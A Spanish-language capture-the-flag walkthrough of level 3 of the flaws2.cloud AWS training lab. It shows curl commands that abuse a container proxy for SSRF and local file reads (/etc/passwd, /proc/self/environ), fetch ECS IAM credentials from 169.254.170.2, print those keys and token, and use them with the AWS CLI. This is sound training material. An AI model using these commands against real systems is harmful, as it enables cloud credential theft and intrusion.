---
title: "Level 3"
---

# Level 3

http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud/

Nos dicen que el contenedor al que tenemos acceso tiene un proxy que se usa así:

http://container.target.flaws2.cloud/proxy/http://flaws.cloud 

Esto nos recuerda al [Level 5](/academies/flaws/flaws-cloud/level-5) de flaws.cloud.

Probamos
```bash
curl http://container.target.flaws2.cloud/proxy/http://169.254.169.254/latest/meta-data/
```

```bash
curl http://container.target.flaws2.cloud/proxy/169.254.169.254/latest/meta-data/
```

Y no sale nada.

Tenemos LFI

```BASH
curl http://container.target.flaws2.cloud/proxy/file:///etc/passwd --output - ; echo
```

Si probamos esto podemos dumpear las variables de entorno de dentro del contenedor:

```bash
curl http://container/proxy/file:///proc/self/environ --output - ; echo
```

```env
HOSTNAME=ip-172-31-47-179.ec2.internal

HOME=/root

AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/7e4ba77c-58ec-4523-bb72-1f719c03a12c

AWS_EXECUTION_ENV=

AWS_ECS_FARGATEECS_AGENT_URI=http://169.254.170.2/api/cb2fb3252d31461abd9fcd33b7980cc5-3779599274

AWS_DEFAULT_REGION=us-east-1

ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/cb2fb3252d31461abd9fcd33b7980cc5-3779599274E

CS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/cb2fb3252d31461abd9fcd33b7980cc5-3779599274

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

AWS_REGION=us-east-1

PWD=/
```

`AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` es la variable que necesitábamos para saber donde están las credenciales de IAM  del contenedor

```bash
curl http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/7e4ba77c-58ec-4523-bb72-1f719c03a12c --output - ; echo
```

```json
{
   "RoleArn":"arn:aws:iam::653711331788:role/level3",
   "AccessKeyId":"ASIAZQNB3KHGBWAKPW24",
   "SecretAccessKey":"t9FATFXqauplJJde8ZmKvBi4AqrILYIxP+3V2/v4",
   "Token":"IQoJb3JpZ2luX2VjEJn//////////wEaCXVzLWVhc3QtMSJGMEQCIGGTHtsJmJm3av954LlJXUa9vwP+BhXgDZjawUxa7RvNAiBzXKmxzBcsi23JCgBPgoR8q+8vDsFXxDZ8pPzeQFJjjSrjAwhiEAMaDDY1MzcxMTMzMTc4OCIMRJlAOBTgP5piPgpZKsADpIalEfU1QSECkJ+52DMUvOevvHa5cOU1bQM8TMSiCXDhLAjg8eT85vehXoENs/5aRgNZe74U3+Q0/cXn2hHO2AlKswMuHxG40uYx8z/0fZkXz/SBJnEcMLNajywXN9+jAgek/9Zf6ZKEA/Hi4OnQsKg5p1WXexwl9ttaHddpLADDdrj7wLxe/VBqz6G7o6PqemI4o06sLkKDXhIP73ypP6WZwZvw2EFZJN24Exg759bDVNRe/7wW4kE14DgVZYMi/8e29BGcjeVCsG9DDIRLC/EHjRDgStdeNzffVcbBMKfXKD7b44QLQMC4kSGuAnWlmlz8BROGkdkSU+M/RRTuC8rEysUgAxl/Koss5KbZ8KbjYkn5UKM41LOWWiuUZUMiaE8KgRN4fGvWfSLjU86HCtgLJFVsSk7UWKl0P8Wdu8CSLhD6eBcucYw2W7nlOr1FQkQ2zXNHAXkheuAYy1jlazR8SuROO3RwpbI0xGAczBL5tipam64pG2S5aHwyav0zmqDl1r1A/CbaOXqRhfy1/esacM40zkpwPX+pOmX3GcOZ1uKOoKZ+xmnfXbstHrQExl9GCBkC2MamAf1p5n9VNDDptaPIBjqmAVb+epjVStCVmkTuaK4cBn9d/8ld73YOIWWPa3tJMNdgYfsirhlVpgQYvWUAsRXJH2N1AiQCC9cDpByQ/JNNFh6Qgvjxr0iEij0X67fOwuL5At5GqaXwPhy6L68WoKptXnvgArIqCP54r7GmwGjVbu8550IGyJopU2De2WZ9oAdtG53O45sqJqpPW91IbCOytNieXRMRoxMBgyFmTlSLC++CiCuYFFw=",
   "Expiration":"2025-11-03T22:40:09Z"
}
```

Nos creamos un profile
```bash
aws configure --profile level3
```

whoami
```bash
aws sts get-caller-identity --profile level3
```

Podemos listar buckets
```bash
aws s3 ls --profile level3
```

http://the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud/
